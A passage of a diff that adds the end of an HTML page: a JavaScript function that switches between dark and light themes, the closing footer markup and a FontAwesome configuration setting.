+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
